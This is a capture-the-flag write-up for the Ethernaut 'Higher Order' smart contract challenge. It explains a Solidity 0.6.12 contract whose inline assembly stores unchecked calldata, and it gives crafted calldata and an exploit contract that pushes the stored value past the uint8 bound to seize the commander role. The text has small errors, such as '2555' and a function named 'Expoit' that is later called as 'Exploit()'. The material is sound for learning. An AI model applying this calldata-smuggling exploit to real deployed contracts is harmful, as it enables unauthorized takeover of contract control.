# Writeup for Higher Order

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

Your objective is to become the Commander of the Higher Order! Good luck!

Things that might help:

- Sometimes, calldata cannot be trusted.
- Compilers are constantly evolving into better spaceships.

### Contract Explaination

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

Click [here](./src/contracts/HigherOrder.sol) to view the contract source code.

<details>
<summary>Click to view the contract explanation</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}

```

This Solidity code defines a contract with two state variables: `commander` of type **address** and `treasury` of type **uint256**.

```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

The function `registerTreasury()` takes an argument of type **uint8** as input. It then loads the calldata starting from the 4th byte and assigns it to the `treasury` variable.

It starts from the fourth byte because the `0th byte` to the `3rd byte` (4 bytes) will be the function selector.

```solidity
function claimLeadership() public {
    if (treasury > 255) commander = msg.sender;
    else revert("Only members of the Higher Order can become Commander");
}
```

The function `claimLeadership()` checks whether the `treasury` value is greater than 255. If it is greater than 255, it sets the `commander` to `msg.sender`.

If the `treasury` value is less than or equal to 255, it reverts with an error message: "Only members of the Higher Order can become Commander.

</details>

### Exploit

Our goal is to become the commander. The only way we can become the commander is by setting the treasury value to greater than 255.

```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

The registerTreasury() fucntion takes an argument of type uint8. The max value of a uint8 is 255. So while calling registerTreasury() we won't be able to pass number more than 2555.

But if we make a low-level call then it won't check whether the data passes is a uint8 or not. Once we pass the value more than 255 by making a low-level call the challenge will be solved.

Now lets construct the calldata.

```bash
$ cast calldata "registerTreasury(uint8)" 255
```

It will give us `0x211c85ab00000000000000000000000000000000000000000000000000000000000000ff`.

Now we need make changes in calldata because we have sent argument as 255. We need to send more than 255. So let's add one more f before two f's.

The final calldata is `0x211c85ab0000000000000000000000000000000000000000000000000000000000000fff`.

Now lets write our Exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract ExploitHigherOrder{
    address HigherOrder;

    constructor(address _addr){
        HigherOrder=_addr;
    }

    function Expoit()public{
        bytes memory Calldata=hex"211c85ab0000000000000000000000000000000000000000000000000000000000000fff";
        (bool a,)=HigherOrder.call(Calldata);
        require(a,"Exploit Failed");
    }
}
```

Deploy the Exploit contract and call the Exploit() function. Once the call is done then call the claimLeadership() from console.

```javascript
> await contract.claimLeadership()
```

Once call this function the challenge will be solved. Now you can submit the instance.

That's it for this challenge hope you enjoyed this challenge.

### Key takeaways

We should be careful while using assembly because we need to handle all the edge cases for whatever logic we write in assembly. Instead of assembly, if we use Solidity, it will perform all checks and ensure that the treasury value will always be less than or equal to 255.

However, the Solidity compiler version greater than 0.8.0 doesn't have this exploit.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
